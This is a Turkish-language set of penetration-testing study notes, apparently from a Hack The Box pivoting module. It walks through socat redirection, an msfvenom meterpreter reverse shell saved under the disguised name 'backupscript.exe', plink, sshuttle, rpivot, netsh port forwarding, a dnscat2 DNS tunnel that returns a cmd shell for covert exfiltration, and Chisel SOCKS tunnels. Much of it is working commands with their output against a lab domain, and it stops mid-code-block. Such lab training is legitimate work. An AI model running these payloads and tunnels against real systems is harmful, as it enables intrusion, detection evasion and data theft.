Socat, localhost'ta 8080 numaralı portu dinleyecek ve tüm trafiği saldırı hostumuzdaki (10.10.14.18) 80 numaralı porta yönlendirecektir. Redirector'ümüz yapılandırıldıktan sonra, Ubuntu sunucumuzda çalışan redirector'ümüze geri bağlanacak bir payload oluşturabiliriz. Ayrıca saldırı hostumuzda bir dinleyici başlatacağız çünkü socat bir hedeften bağlantı alır almaz, tüm trafiği saldırı konağımızın dinleyicisine yönlendirecek ve burada bir shell alacağız.

#### Creating the Windows Payload
```shell-session
M1R4CKCK@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
Bu payload'u Windows host'a aktarmamız gerektiğini unutmayın. Bunu yapmak için önceki bölümlerde kullanılan tekniklerden bazılarını kullanabiliriz.


#### Starting MSF Console
```shell-session
M1R4CKCK@htb[/htb]$ sudo msfconsole

<SNIP>
```

#### Configuring & Starting the multi/handler
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

Payload'umuzu windows host üzerinde tekrar çalıştırarak bunu test edebiliriz ve bu sefer Ubuntu sunucusundan bir ağ bağlantısı görmeliyiz.


#### Meterpreter Oturumunun Kurulması
```shell-session
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```





























# Windows için SSH: plink.exe
PuTTY Link'in kısaltması olan [Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), yüklendiğinde PuTTY paketinin bir parçası olarak gelen bir Windows komut satırı SSH aracıdır. SSH'ye benzer şekilde Plink, dinamik port yönlendirmeleri ve SOCKS proxy'leri oluşturmak için de kullanılabilir. [2018](https://learn.microsoft.com/en-us/windows-server/administration/OpenSSH/openssh-overview) Sonbaharından önce, Windows'un yerel bir ssh istemcisi yoktu, bu nedenle kullanıcıların kendi ssh istemcilerini yüklemeleri gerekiyordu. Diğer hostlara bağlanması gereken birçok sysadmin için tercih edilen araç [PuTTY](https://www.putty.org/) idi.

Bir pentestte olduğumuzu ve bir Windows makinesine erişim sağladığımızı düşünün. Hostu ve güvenlik duruşunu hızlı bir şekilde listeliyoruz ve orta derecede kilitli olduğunu belirliyoruz. Bu hostu bir pivot noktası olarak kullanmamız gerekiyor, ancak kendi araçlarımızı açığa çıkmadan hostun üzerine çekebilmemiz pek mümkün değil. Bunun yerine, arazide yaşayabilir ve zaten orada olanları kullanabiliriz. Eğer host daha eskiyse ve PuTTY mevcutsa (ya da bir dosya paylaşımında bir kopyasını bulabilirsek), Plink zafere giden yolumuz olabilir. Pivotumuzu oluşturmak için onu kullanabilir ve potansiyel olarak tespit edilmekten biraz daha kaçınabiliriz.

Bu, Plink'in faydalı olabileceği potansiyel senaryolardan sadece bir tanesidir. Linux tabanlı bir sistem yerine birincil saldırı hostumuz olarak bir Windows sistemi kullanırsak da Plink'i kullanabiliriz.


### Plink'i Tanımak
Aşağıdaki görüntüde, Windows tabanlı bir saldırı hostumuz var.

![Pasted image 20241006152733.png](/img/user/resimler/Pasted%20image%2020241006152733.png)

Windows saldırı hostu, Ubuntu sunucusu üzerinden dinamik bir port iletimi başlatmak için aşağıdaki komut satırı argümanlarıyla bir plink.exe işlemi başlatır. Bu, Windows saldırı hostu ile Ubuntu sunucusu arasında bir SSH oturumu başlatır ve ardından plink 9050 numaralı portu dinlemeye başlar.

#### Using Plink.exe
![Pasted image 20241006152901.png](/img/user/resimler/Pasted%20image%2020241006152901.png)

Oluşturduğumuz SSH oturumu üzerinden bir SOCKS tüneli başlatmak için [Proxifier](https://www.proxifier.com/) adlı başka bir Windows tabanlı araç kullanılabilir. Proxifier, masaüstü client uygulamaları için tünelli bir ağ oluşturan ve bunun bir SOCKS ya da HTTPS proxy üzerinden çalışmasını sağlayan ve proxy zincirlemesine izin veren bir Windows aracıdır. Plink tarafından 9050 portunda başlatılan SOCKS sunucumuz için yapılandırmayı sağlayabileceğimiz bir profil oluşturmak mümkündür.
![Pasted image 20241006153016.png](/img/user/resimler/Pasted%20image%2020241006153016.png)
SOCKS sunucusunu 127.0.0.1 ve 9050 portu için yapılandırdıktan sonra, RDP bağlantılarına izin veren bir Windows hedefiyle bir RDP oturumu başlatmak için doğrudan mstsc.exe'yi başlatabiliriz.


### Sshuttle ile SSH Pivotlama
[Sshuttle](https://github.com/sshuttle/sshuttle), proxy zincirlerini yapılandırma ihtiyacını ortadan kaldıran Python'da yazılmış başka bir araçtır. Ancak, bu araç yalnızca SSH üzerinden pivotlama için çalışır ve TOR veya HTTPS proxy sunucuları üzerinden pivotlama için başka seçenekler sunmaz. Sshuttle, iptables'ın yürütülmesini otomatikleştirmek ve remote host için pivot kuralları eklemek için son derece yararlı olabilir. Ubuntu sunucusunu bir pivot noktası olarak yapılandırabilir ve bu bölümün ilerleyen kısımlarındaki örneği kullanarak Nmap'in tüm ağ trafiğini sshuttle ile yönlendirebiliriz.

sshuttle'ın ilginç bir kullanımı, remote hostlara bağlanmak için proxychains kullanmamıza gerek kalmamasıdır. Ubuntu pivot hostumuz üzerinden sshuttle'ı kuralım ve RDP üzerinden Windows hostuna bağlanacak şekilde yapılandıralım.


#### Installing sshuttle
![Pasted image 20241007155106.png](/img/user/resimler/Pasted%20image%2020241007155106.png)

sshuttle kullanmak için, remote makineye bir kullanıcı adı ve şifre ile bağlanmak için -r seçeneğini belirtiriz. Ardından, pivot host üzerinden yönlendirmek istediğimiz ağı veya IP'yi eklememiz gerekir, bizim durumumuzda 172.16.5.0/23 ağıdır.

#### Running sshuttle
![Pasted image 20241007155201.png](/img/user/resimler/Pasted%20image%2020241007155201.png)
Bu komutla, sshuttle iptables'da tüm trafiği pivot host üzerinden 172.16.5.0/23 ağına yönlendirmek için bir giriş oluşturur.

#### iptables Rotaları Üzerinden Trafik Rotalama
```shell-session
M1R4CKCK@htb[/htb]$ nmap -v -sV -p3389 172.16.5.19 -A -Pn

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 11:16 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:16
Completed Parallel DNS resolution of 1 host. at 11:16, 0.15s elapsed
Initiating Connect Scan at 11:16
Scanning 172.16.5.19 [1 port]
Completed Connect Scan at 11:16, 2.00s elapsed (1 total ports)
Initiating Service scan at 11:16
NSE: Script scanning 172.16.5.19.
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Initiating NSE at 11:16
Completed NSE at 11:16, 0.00s elapsed
Nmap scan report for 172.16.5.19
Host is up.

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: inlanefreight.local
|   DNS_Computer_Name: DC01.inlanefreight.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-14T02:58:25+00:00
|_ssl-date: 2022-08-14T02:58:25+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=DC01.inlanefreight.local
| Issuer: commonName=DC01.inlanefreight.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-13T02:51:48
| Not valid after:  2023-02-12T02:51:48
| MD5:   58a1 27de 5f06 fea6 0e18 9a02 f0de 982b
|_SHA-1: f490 dc7d 3387 9962 745a 9ef8 8c15 d20e 477f 88cb
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6s, deviation: 0s, median: 6s
```

Artık proxychains kullanmadan herhangi bir aracı doğrudan kullanabiliriz.


# Web Server Pivoting with Rpivot
[Rpivot](https://github.com/klsecservices/rpivot), SOCKS tünelleme için Python'da yazılmış bir reverse SOCKS proxy aracıdır. Rpivot, bir şirket ağı içindeki bir makineyi dış bir sunucuya bağlar ve istemcinin sunucu tarafındaki lokal portunu açığa çıkarır. Aşağıdaki senaryoda iç ağımızda (172.16.5.135) bir web sunucumuz olduğunu ve buna rpivot proxy kullanarak erişmek istediğimizi ele alacağız.

![Pasted image 20241007170611.png](/img/user/resimler/Pasted%20image%2020241007170611.png)	

Client'ın 9999 portuna bağlanmasına izin vermek ve proxy pivot bağlantıları için 9050 portunu dinlemek için aşağıdaki komutu kullanarak rpivot SOCKS proxy sunucumuzu başlatabiliriz.

#### Cloning rpivot
```shell-session
$ git clone https://github.com/klsecservices/rpivot.git
```

#### Installing Python2.7
```shell-session
$ sudo apt-get install python2.7
```

### Python2.7'nin Alternatif Kurulumu
```shell-session
M1R4CKCK@htb[/htb]$ curl https://pyenv.run | bash
M1R4CKCK@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
M1R4CKCK@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
M1R4CKCK@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc
M1R4CKCK@htb[/htb]$ source ~/.bashrc
M1R4CKCK@htb[/htb]$ pyenv install 2.7
M1R4CKCK@htb[/htb]$ pyenv shell 2.7
```

Server.py kullanarak tehlikeye atılmış Ubuntu sunucusundaki client'ımıza bağlanmak için rpivot SOCKS proxy sunucumuzu başlatabiliriz.

### Attack Host'tan server.py dosyasını çalıştırma
```shell-session
$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```


#### rpivot'u Hedefe Aktarma
```shell-session
M1R4CKCK@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```


### Pivot Target'tan client.py dosyasını çalıştırma

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```


### Bağlantının Kurulduğunu Onaylama
```shell-session
New connection from host 10.129.202.64, source port 35226
```

Proxychains'i, başlangıçta Python sunucusu tarafından başlatılan saldırı hostumuzda 127.0.0.1:9050 adresindeki yerel sunucumuz üzerinden dönecek şekilde yapılandıracağız.

Son olarak, proxychains ve Firefox kullanarak 172.16.5.0/23 dahili ağında 172.16.5.135:80 adresinde barındırılan sunucu tarafımızdaki web sunucusuna erişebilmeliyiz.


### Proxy Zincirleri Kullanarak Hedef Web Sunucusuna Tarama
```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![Pasted image 20241007171211.png](/img/user/resimler/Pasted%20image%2020241007171211.png)

Yukarıdaki pivot proxy'ye benzer şekilde, buluttaki dış sunucu (saldırı hostu) ile doğrudan pivot yapamadığımız senaryolar olabilir. Bazı kuruluşların Domain Controller ile yapılandırılmış [NTLM kimlik doğrulamalı HTTP-proxy'si](https://learn.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) vardır. Bu gibi durumlarda, bir kullanıcı adı ve parola sağlayarak NTLM proxy aracılığıyla kimlik doğrulaması yapmak için rpivot'a ek bir NTLM kimlik doğrulama seçeneği sağlayabiliriz. Bu durumlarda, rpivot'un client.py dosyasını aşağıdaki şekilde kullanabiliriz:

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```



### Windows Netsh ile Port Yönlendirme
[Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts), belirli bir Windows sisteminin ağ yapılandırmasına yardımcı olabilecek bir Windows komut satırı aracıdır. İşte Netsh'i kullanabileceğimiz ağ ile ilgili görevlerden sadece bazıları:
* Rotaları bulma
* Güvenlik duvarı yapılandırmasını görüntüleme
* Proxy ekleme
* Port yönlendirme kuralları oluşturma

Aşağıdaki senaryoda, ele geçirilen hostun Windows 10 tabanlı bir BT yöneticisinin workstation'ı (10.129.15.150,172.16.5.25) olduğu bir örneği ele alalım. Sosyal mühendislik ve oltalama gibi yöntemlerle bir çalışanın workstation'ına erişim sağlamamızın mümkün olduğunu unutmayın. Bu, workstaion'un bulunduğu ağın içinden daha fazla pivot yapmamızı sağlayacaktır.
![Pasted image 20241007203332.png](/img/user/resimler/Pasted%20image%2020241007203332.png)
Belirli bir porttan (örneğin 8080) alınan tüm verileri remote bir porttaki remote host'a iletmek için netsh.exe'yi kullanabiliriz. Bu işlem aşağıdaki komut kullanılarak gerçekleştirilebilir.


### Port Yönlendirmek için Netsh.exe Kullanma

```cmd-session
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```


### Port Yönlendirmeyi Doğrulama
```cmd-session
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```

Windows tabanlı pivot hostumuzda portproxy'yi yapılandırdıktan sonra, xfreerdp kullanarak saldırı hostumuzdan bu hostun 8080 portuna bağlanmaya çalışacağız. Saldırı hostumuzdan bir istek gönderildiğinde, Windows host trafiğimizi netsh.exe tarafından yapılandırılan proxy ayarlarına göre yönlendirecektir.

![Pasted image 20241007210924.png](/img/user/resimler/Pasted%20image%2020241007210924.png)



# Dnscat2 ile DNS Tünelleme
[Dnscat2](https://github.com/iagox86/dnscat2), iki host arasında veri göndermek için DNS protokolünü kullanan bir tünelleme aracıdır. Şifrelenmiş bir Command-&-Control (C&C veya C2) kanalı kullanır ve verileri DNS protokolü içindeki TXT kayıtları içinde gönderir. Genellikle, bir şirket ağındaki her active directory domain ortamı, host adlarını IP adreslerine çözümleyecek ve trafiği kapsayıcı DNS sistemine katılan external DNS sunucularına yönlendirecek olan kendi DNS sunucusuna sahip olacaktır. Ancak, dnscat2 ile adres çözümlemesi external bir sunucudan talep edilir. Lokal bir DNS sunucusu bir adresi çözümlemeye çalıştığında, legal  bir DNS isteği yerine veriler dışarı sızdırılır ve ağ üzerinden gönderilir. Dnscat2, HTTPS bağlantılarını kesen ve trafiği koklayan güvenlik duvarı tespitlerinden kaçarken veri sızdırmak için son derece gizli bir yaklaşım olabilir. Test örneğimiz için, atak hostumuzda dnscat2 sunucusunu kullanabilir ve dnscat2 istemcisini başka bir Windows hostunda çalıştırabiliriz.


### dnscat2'nin Kurulumu ve Kullanımı
Eğer dnscat2 saldırı hostumuzda kurulu değilse, aşağıdaki komutları kullanarak bunu yapabiliriz:


### dnscat2'yi Klonlama ve Sunucuyu Kurma
```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Daha sonra dnscat2 dosyasını çalıştırarak dnscat2 sunucusunu başlatabiliriz.


### dnscat2 sunucusunu başlatma

```shell-session
$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Sunucuyu çalıştırdıktan sonra, bize Windows host üzerindeki dnscat2 client'ımıza sağlamamız gereken gizli anahtarı sağlayacaktır, böylece external dnscat2 server'ımıza gönderilen verileri doğrulayabilir ve şifreleyebilir. Client'ı dnscat2 projesi ile kullanabilir veya dnscat2 sunucumuzla bir tünel kurmak için Windows hedeflerinden çalıştırabileceğimiz dnscat2 uyumlu PowerShell tabanlı bir client olan [dnscat2-powershell'i](https://github.com/lukebaggett/dnscat2-powershell) kullanabiliriz. Client dosyasını içeren projeyi saldırı hostumuza klonlayabilir, ardından hedefe aktarabiliriz.


### dnscat2-powershell'i Atak Hostuna Klonlama

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

dnscat2.ps1 dosyası hedefe yerleştirildikten sonra dosyayı içe aktarabilir ve ilgili cmd-let'leri çalıştırabiliriz.


#### Importing dnscat2.ps1

```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1
```

dnscat2.ps1 içe aktarıldıktan sonra, atak hostumuzda çalışan sunucu ile bir tünel kurmak için kullanabiliriz. Sunucumuza bir CMD shell oturumunu geri gönderebiliriz.

```powershell-session
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Oturumumuzun kurulmasını ve şifrelenmesini sağlamak için sunucuda oluşturulan ön paylaşımlı gizli bilgiyi (-PreSharedSecret) kullanmalıyız. Tüm adımlar başarıyla tamamlanırsa, sunucumuzla bir oturum kurulduğunu göreceğiz.


### Oturum Kuruluşunun Onaylanması
```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

Komut istemine ? yazarak dnscat2 ile sahip olduğumuz seçenekleri listeleyebiliriz.


### dnscat2 Seçeneklerini Listeleme

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

Dnscat2'yi oturumlarla etkileşime geçmek ve etkileşimlerde hedef ortamda daha ileri gitmek için kullanabiliriz. Bu modülde dnscat2 ile ilgili tüm olasılıkları ele almayacağız, ancak onunla pratik yapmanız ve hatta bir etkileşimde kullanmak için yaratıcı yollar bulmanız şiddetle tavsiye edilir. Kurduğumuz oturumla etkileşime geçelim ve bir shell'e girelim.


### Kurulan Oturum ile Etkileşim Kurma
```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```


Soru : Bu bölümde öğretilen kavramları kullanarak hedefe bağlanın ve bir shell oturumu sağlayan bir DNS Tüneli oluşturun. C:\Users\htb-student\Documents\flag.txt dosyasının içeriğini cevap olarak gönderin.

Cevap : 



# SOCKS5 Tunneling with Chisel
[Chisel](https://github.com/jpillora/chisel), SSH kullanılarak güvence altına alınan verileri taşımak için HTTP kullanan Go ile yazılmış TCP/UDP tabanlı bir tünelleme aracıdır. Chisel, güvenlik duvarı ile sınırlandırılmış bir ortamda client-server tünel bağlantısı oluşturabilir. Trafiğimizi 172.16.5.0/23 ağındaki (iç ağ) bir web sunucusuna tünellememiz gereken bir senaryoyu ele alalım. Elimizde 172.16.5.19 adresine sahip bir Domain Controller var. Saldırı hostumuz ve domain kontrolörümüz farklı ağ segmentlerine ait olduğu için bu host saldırı hostumuz tarafından doğrudan erişilebilir değildir. Ancak, Ubuntu sunucusunu ele geçirdiğimiz için, üzerinde belirli bir portu dinleyecek ve trafiğimizi kurulan tünel üzerinden iç ağa iletecek bir Chisel sunucusu başlatabiliriz.


### Chisel Kurulumu ve Kullanımı
Chisel'i kullanabilmemiz için önce saldırı hostumuzda olması gerekir. Eğer saldırı hostumuzda Chisel yoksa, doğrudan aşağıdaki komutu kullanarak proje reposunu klonlayabiliriz:,


#### Cloning Chisel
```shell-session
$ git clone https://github.com/jpillora/chisel.git
```
Chisel Binary'sini oluşturmak için sistemimizde Go programlama dilinin kurulu olması gerekir. Sistemde Go yüklü olduğunda, bu dizine geçebilir ve Chisel binary'sini oluşturmak için go build'i kullanabiliriz.


#### Building the Chisel Binary
```shell-session
M1R4CKCK@htb[/htb]$ cd chisel
go build
```
Müşterilerimizin ağlarındaki hedeflere aktardığımız dosyaların boyutuna dikkat etmek, yalnızca performans nedenleriyle değil, aynı zamanda algılama açısından da yararlı olabilir. Bu kavramı tamamlayan iki faydalı kaynak Oxdf'nin “Chisel ve SSF ile Tünel Açma” başlıklı blog yazısı ve IppSec'in Reddish kutusuna ilişkin incelemesidir. IppSec, Chisel ile ilgili açıklamasına, binary'yi oluşturmaya ve binary'nin boyutunu küçültmeye videosunun [24:29'](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)unda başlıyor.

Binary oluşturulduktan sonra, bunu hedef pivot host'a aktarmak için SCP'yi kullanabiliriz.


#### Transferring Chisel Binary to Pivot Host
```shell-session
M1R4CKCK@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```
Sonra Chisel server/listener'ı başlatabiliriz.


#### Running the Chisel Server on the Pivot Host
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```
Chisel listener, SOCKS5 (--socks5) kullanarak 1234 numaralı porttan gelen bağlantıları dinleyecek ve pivot hosttan erişilebilen tüm ağlara yönlendirecektir. Bizim durumumuzda, pivot host 172.16.5.0/23 ağında bir arayüze sahiptir, bu da bu ağdaki hostlara ulaşmamızı sağlayacaktır.

Saldırı hostumuzda bir istemci başlatabilir ve Chisel sunucusuna bağlanabiliriz.


#### Connecting to the Chisel Server
```shell-session
M1R4CKCK@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```
Yukarıdaki çıktıda görebileceğiniz gibi, Chisel client, Chisel server ile client arasında SSH kullanarak HTTP üzerinden güvenli bir TCP/UDP tüneli oluşturdu ve 1080 portunu dinlemeye başladı. Şimdi ==/etc/proxychains.conf== adresinde bulunan proxychains.conf dosyamızı değiştirebilir ve sonuna 1080 portu ekleyebiliriz, böylece proxychains'i 1080 portu ile SSH tüneli arasında oluşturulan tüneli kullanarak pivotlamak için kullanabiliriz.


### Proxychains.conf'u Düzenleme ve Onaylama
Proxychains.conf dosyasını düzenlemek için istediğimiz herhangi bir metin düzenleyicisini kullanabilir, ardından yapılandırma değişikliklerimizi tail kullanarak onaylayabiliriz.
```shell-session
M1R4CKCK@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```
Şimdi RDP ile proxyychains kullanırsak, Pivot host'a oluşturduğumuz tünel üzerinden iç ağdaki DC'ye bağlanabiliriz.


### Pivoting to the DC
```shell-session
M1R4CKCK@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```


## Chisel Reverse Pivot
Önceki örnekte, ele geçirilen makineyi (Ubuntu) Chisel sunucumuz olarak kullandık ve 1234 numaralı portta listeleme yaptık. Yine de, güvenlik duvarı kurallarının tehlikeye atılan hedefimize gelen bağlantıları kısıtladığı senaryolar olabilir. Bu gibi durumlarda, Chisel'i reverse seçeneği ile kullanabiliriz.

Chisel sunucusunda --reverse etkinleştirildiğinde, tersine çevirmeyi belirtmek için Remote'ların önüne R eklenebilir. Sunucu bağlantıları dinleyecek ve kabul edecek ve bunlar remote'ı belirten client üzerinden proxy'lenecektir. R:socks belirten ters remote'lar sunucunun varsayılan socks portunu (1080) dinleyecek ve bağlantıyı client'ın internal SOCKS5 proxy'sinde sonlandıracaktır.

Sunucuyu --reverse seçeneği ile saldırı hostumuzda başlatacağız.



### Saldırı Hostumuzda Chisel Sunucusunu Başlatma
```shell-session
M1R4CKCK@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Daha sonra R:socks seçeneğini kullanarak Ubuntu'dan (pivot host) saldırı hostumuza bağlanıyoruz


#### Chisel Client'ı Saldırı Host'umuza Bağlama
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Proxychains.conf dosyasını düzenlemek için istediğimiz herhangi bir editörü kullanabilir, ardından yapılandırma değişikliklerimizi tail kullanarak onaylayabiliriz.


### Proxychains.conf'u Düzenleme ve Onaylama
```shell-session
M1R4CKCK@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

RDP ile proxyychains kullanırsak, Pivot host'a oluşturduğumuz tünel üzerinden iç ağdaki DC'ye bağlanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

Not: Hedef üzerinde chisel ile bir hata mesajı alıyorsanız, farklı bir sürümle [deneyin](https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz).


Chisel bozuk olduğu için atlıyorum .




# ICMP Tunneling with SOCKS
ICMP tünelleme, trafiğinizi echo istekleri ve yanıtları içeren ICMP paketleri içinde kapsüller. ICMP tünelleme yalnızca güvenlik duvarlı bir ağ içinde ping yanıtlarına izin verildiğinde çalışır. Güvenlik duvarlı bir ağ içindeki bir hostun bir external sunucuya ping atmasına izin verildiğinde, trafiğini ping echo isteği içinde kapsülleyebilir ve bunu bir external sunucuya gönderebilir. Dış sunucu bu trafiği doğrulayabilir ve uygun bir yanıt gönderebilir; bu da veri sızdırma ve dış sunucuya pivot tüneller oluşturma için son derece kullanışlıdır.

Ubuntu sunucumuz ile saldırı hostumuz arasında bir tünel oluşturmak için [ptunnel-ng](https://github.com/utoni/ptunnel-ng) aracını kullanacağız. Bir tünel oluşturulduktan sonra, trafiğimizi ptunnel-ng client üzerinden proxy olarak kullanabileceğiz. Hedef pivot host üzerinde ptunnel-ng sunucusunu başlatabiliriz. ptunnel-ng'yi kurarak başlayalım.
	


### ptunnel-ng Kurulumu ve Kullanımı
Eğer ptunnel-ng saldırı hostumuzda değilse, git kullanarak projeyi klonlayabiliriz.

#### Cloning Ptunnel-ng
```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

ptunnel-ng reposu saldırı hostumuza klonlandıktan sonra, ptunnel-ng dizininin root'unda bulunan autogen.sh betiğini çalıştırabiliriz.



### Autogen.sh ile Ptunnel-ng Oluşturma
```shell-session
M1R4CKCK@htb[/htb]$ sudo ./autogen.sh 
```

autogen.sh çalıştırıldıktan sonra ptunnel-ng client ve server tarafında kullanılabilir. Şimdi depoyu atak hostumuzdan hedef hostumuza aktarmamız gerekecek. Önceki bölümlerde olduğu gibi dosyaları aktarmak için SCP kullanabiliriz. Eğer tüm depoyu ve içerisindeki dosyaları aktarmak istiyorsak SCP ile -r seçeneğini kullanmamız gerekecek.


### Statik bir binary oluşturmak için alternatif yaklaşım
```shell-session
